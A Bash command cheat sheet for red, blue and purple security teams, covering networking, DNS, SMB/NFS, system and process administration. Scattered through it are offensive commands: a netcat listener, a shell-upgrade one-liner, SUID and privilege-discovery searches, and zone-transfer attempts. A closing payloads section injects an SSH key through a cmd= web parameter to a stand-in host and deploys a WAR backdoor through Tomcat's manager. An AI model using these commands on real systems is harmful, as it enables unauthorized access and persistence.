# Bash for Red-Blue-Purple Security Teams

> Commands oriented to security workflows; also useful for administration and scripting.
> Placeholders: `<ip>`, `<user>`, `<port>`, `<file>`, `<iface>`, `<mac>`, `<domain>`, `<dns_server>`, `<pid>`, `<pattern>`, `<processname>`.

---

**SECTIONS**: [Network & Discovery](#network--discovery) · [Interfaces & Link Management](#interfaces--link-management) · [DNS & Name Services](#dns--name-services) · [SMB / NFS / Remote Files](#smb--nfs--remote-files) · [Traffic Capture & Services](#traffic-capture--services) · [Firewall & Forwarding](#firewall--forwarding) · [System Information](#system-information) · [Users & Accounts](#users--accounts) · [Processes & Sessions](#processes--sessions) · [Files, Permissions & Privilege Discovery](#files-permissions--privilege-discovery) · [Packages & Binaries](#packages--binaries) · [Functional Utilities](#functional-utilities) · [Payloads & Exploit Examples](#payloads--exploit-examples)

---

## Network & Discovery

### Monitor network connections (live)

```bash
watch ss -tp
```

> `ss` (Socket Statistics) is preferred over `netstat` on modern systems.

### List TCP connections / listeners

```bash
ss -t state established    # Show only established active connections
sudo ss -atp               # Detailed view, including process association
ss -tl                     # Shows only listening connections
```

> `ss` (Socket Statistics) is provided by `iproute2` on modern Linux.

```bash
netstat -ant
netstat -tulpn
```

### List open network-related file handles

```bash
lsof -i
```

### Wi‑Fi scanning

```bash
iwlist <iface> scan
```

### Listen on a TCP/UDP port

```bash
nc -lvnp <port>
```

### Simple web server (for quick file hosting)

```bash
python3 -m http.server <port>
```

---

## Interfaces & Link Management

### Show interfaces / link state

```bash
ip link show
```

### Add an IP address (alias / additional)

```bash
ip addr add <ip>/<cidr> dev <iface>
# older style (alias)
ifconfig <iface>:1 <ip> netmask <mask>
```

### Set IP address and netmask

```bash
ifconfig <iface> <ip> netmask <mask>
```

### Set default gateway

```bash
route add default gw <gateway_ip>
```

### Change MTU

```bash
ifconfig <iface> mtu <size>
```

### Change MAC address (modern)

```bash
sudo ip link set dev <iface> down
sudo ip link set dev <iface> address <mac>
sudo ip link set dev <iface> up
```

### Change MAC address (older systems)

```bash
sudo ifconfig <iface> hw ether <mac>
```

### Change MAC address with `macchanger`

```bash
sudo macchanger -m <mac> <iface>
```

---

## DNS & Name Services

### Reverse DNS lookup

```bash
dig -x <ip>
host <ip>
```

### Query SRV records

```bash
host -t SRV _service._tcp.example.com
```

### Attempt zone transfer (AXFR)

```bash
dig @<dns_server> <domain> AXFR
host -l <domain> <dns_server>
```

### Add a DNS server (temporary)

```bash
echo "nameserver <ip>" >> /etc/resolv.conf
```

---

## SMB · NFS · Remote Files

### SMB — GUI (open in file manager)

```
smb://<ip>/<share>
```

### Mount Windows/CIFS share (CLI)

```bash
mount -t cifs //<ip>/<share> /mnt/share -o username=<user>
```

### SMB client

```bash
smbclient //<ip>/<share> -U <user>
```

### NFS — show exports / mount

```bash
showmount -e <ip>
mkdir -p /site_backups && mount -t nfs <ip>:/ /site_backups
```

### Copy files (scp)

```bash
scp /tmp/<file> <user>@<ip>:/tmp/<file>
scp <user>@<ip>:/tmp/<file> /tmp/<file>
```

---

## Traffic Capture & Services

*(This section intentionally short — use dedicated tools for deep capture: tcpdump, tshark, wireshark.)*

### Simple listener / service spoofing

```bash
nc -lvnp <port>
python3 -m http.server <port>
```

### Log DHCP messages

```bash
grep DHCP /var/log/messages
```

---

## Firewall & Forwarding

### Block an IP/port (iptables)

```bash
iptables -A INPUT -s <ip> -p tcp --dport <port> -j DROP
```

### Enable IP forwarding

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

## System Information

### Kernel and architecture

```bash
uname -a
cat /proc/version
```

### OS / distribution (portable)

```bash
# preferred
[ -f /etc/os-release ] && . /etc/os-release && echo "$NAME $VERSION" || cat /etc/*release
```

### Mounted filesystems

```bash
mount
df -h
```

### Display logged-in users
```bash
w
```

### Display user information

```bash
who -a
```

### Display last logged-in users

```bash
last -a
```

### Display running processes

```bash
ps -ef
```

---

## Users & Accounts

### Add / set passwd / remove

```bash
useradd -m <username>
passwd <username>
userdel <username>
```

### Get user ID

```bash
id -u
```

### Get group ID

```bash
getent group <GROUPNAME> | cut -d: -f3
```

---

## Processes & Sessions

### Spawn or upgrade to interactive shell

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

### Record terminal session to file

```bash
script -a <outfile>
```

### Command history / recall

```bash
history
!<num>
```

### Kill a process by PID

```bash
kill <pid>     # send SIGTERM (15) — polite shutdown
kill -9 <pid>  # send SIGKILL  (9) — force kill, use as last resort
```

## Kill a process by name / pattern

```bash
pkill <pattern>        # send SIGTERM to processes matching pattern
pkill -9 <pattern>     # force kill matching processes
killall <processname>  # kill all processes with that name
```

## Find which process is using a file / port

```bash
fuser -v <filename>
fuser -n tcp <port>   # show PID using TCP port
lsof -i :<port>       # also shows process for port
```

## Adjust process priority (nice / renice)
```bash
nice -n 10 command     # start process with lower priority (higher nice value)
renice -n -5 -p <pid>  # change priority of existing PID (negative = higher priority)
```

---

## Files, Permissions & Privilege Discovery

### Find SUID binaries

```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

### Find SUID owned by root

```bash
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

### Find writable files not owned by current user (be careful)

```bash
find / -writable ! -user $(whoami) -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
```

---

## Packages & Binaries

### Locate executable path

```bash
which <executable_name>
```

### Installed packages (RHEL / CentOS)

```bash
rpm -qa
rpm -ivh package.rpm        # install
rpm -e package              # remove
```

### Installed packages (Debian / Ubuntu)

```bash
dpkg --get-selections
dpkg -i package.deb         # install
dpkg -r package             # remove
```

### Solaris

```bash
pkginfo
```

---

## Functional Utilities & Shortcuts

### Download a file

```bash
wget http://example.com/<file> -O <file>
```

### Remote desktop

```bash
rdesktop <ip>
```

### Search commands / man-db

```bash
apropos <subject>
```

### PATH manipulation

```bash
export PATH="$PATH:/home/mypath"   # append (prefer system binaries)
export PATH="/home/mypath:$PATH"   # prepend (override system binaries)
```

> Note: append = FIFO (system wins on name collisions); prepend = LIFO (your bin wins).

### Display list of files with process owners (users)

```bash
getent passwd
```

---

## Payloads & Exploit Examples

> ⚠️ **Authorized testing only.** Use these commands only within legal scope and with explicit permission.

### Shellcode → disassembly

```bash
cat shellcode.txt | xxd -p -r > shellcode.bin && ndisasm -b 64 shellcode.bin
```

### Exfil via GET parameter (example)

```bash
curl -G 'http://example.com/file.php' --data-urlencode 'cmd=echo ssh-rsa AA.......'
```

### Exploit LFI to deploy a WAR backdoor (Tomcat example)

```bash
curl --user 'tomcat:<password>' --upload-file exploit.war "http://<host>:8080/manager/text/deploy?path=/exploit"
```
